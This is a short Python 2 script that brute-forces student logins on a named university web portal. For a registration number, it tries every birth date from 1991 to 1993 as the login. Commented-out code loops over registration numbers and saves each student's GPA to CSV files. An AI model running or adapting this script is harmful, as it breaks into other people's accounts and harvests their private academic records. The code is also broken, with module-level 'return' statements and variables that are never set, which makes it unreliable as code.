__author__ = 'amukhopadhyay'

from mechanize import Browser
import thread
from bs4 import BeautifulSoup,SoupStrainer

def validate(br, bday, reg):
    br.select_form(name="loginform")
    # Browser passes through unknown attributes (including methods)
    # to the selected HTMLForm (from ClientForm).
    #br["cheeses"] = ["mozzarella", "caerphilly"]  # (the method here is __setitem__)
    br["idValue"] = str(reg)
    br["birthDate"] = bday


    response = br.submit()
    soup = BeautifulSoup(br.response().read())
    soup = BeautifulSoup(soup.prettify())
    # divTag = soup.find_all("div", {"class":"nav-collapse collapse"})
    # divTag = soup.find_all("ul", {"class":"nav top-2"})

    for link in soup.find_all('a'):
        x = link.string
        y = str(x).strip()
        if y == "Student Profile":
            return "valid"
        else:
            return "invalid"


br = Browser()
br.open("http://websismit.manipal.edu/websis/control/main/")
print br.response()
#get name from data.txt, search in fb.txt, if not then iterate, else go for it.
reg = 100911001

for i in range (1991, 1993):
        for j in range (1, 13):
            for k in range(1, 32):
                # print k, "  ", j, "  ", i
                if i== 1993 and j >6:
                    return "invalid"
                if i==1991 and j<4:
                    j=5
                print (str(i)+"-"+str(j)+"-"+str(k)), "  ", reg
                if k<10:
                    kstr="0"+str(k)
                if j < 10:
                    jstr="0"+str(j)
                if validate(br, (str(i)+"-"+str(jstr)+"-"+str(kstr)), reg) == "valid":
                    bday= str(i)+"-"+str(jstr)+"-"+str(kstr)
                    print bday
                    return bday
print "invalid"
# reg = 100911700
# while reg < 100911900:
#     bday = iterateOver(br, reg)
#     if bday == "invalid":
#         print "\n\n\n", "regchange  ",reg, "\n\n\n"
#         reg+=2
#     else:
#         f = open('gpa_IT.csv','a')
#         # python will convert \n to os.linesep
#         writeGPA(br, f, reg, bday)
#         f.close()
#         reg+=2
#         print "\n\n\n", "regchange  ",reg, "\n\n\n"
#         br = Browser()
#
#         # choice = raw_input('continue?')
#         # if choice == "1":
#         #     break
#         # else:
#         f = open('gpa_IT_100Plus.csv','a')
#         br.open("http://websismit.manipal.edu/websis/control/main/")